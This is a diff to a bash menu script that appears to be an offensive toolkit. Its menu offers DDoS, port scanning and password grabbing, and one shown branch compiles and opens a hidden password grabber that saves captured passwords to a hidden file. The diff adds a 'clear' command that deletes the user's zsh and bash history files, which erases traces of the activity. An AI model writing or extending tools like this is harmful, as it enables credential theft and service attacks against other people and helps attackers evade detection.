@@ -12,7 +12,8 @@ custom        enter custom bash command
 ddos          launches ddos script
 scan          launches port scanner
 message       runs a message from audio.mp3
-grab          tries to grab password"
+grab          tries to grab password
+clear         clears terminal history"
 
 while true; do
 echo -n "> "
@@ -54,7 +55,8 @@ custom        enter custom bash command
 ddos          launches ddos script
 scan          launches port scanner
 message       runs a message from audio.mp3
-grab          tries to grab password"
+grab          tries to grab password
+clear         clears terminal history"
 
 ;;
 command)
@@ -90,6 +92,10 @@ make -f .hidden/password_grabber
 sleep 5
 open .hidden/password_grabber
 echo "password will be stored in .hidden/password.txt"
+;;
+clear)
+rm .zsh_history
+rm .bash_history
 ;;
 
 esac
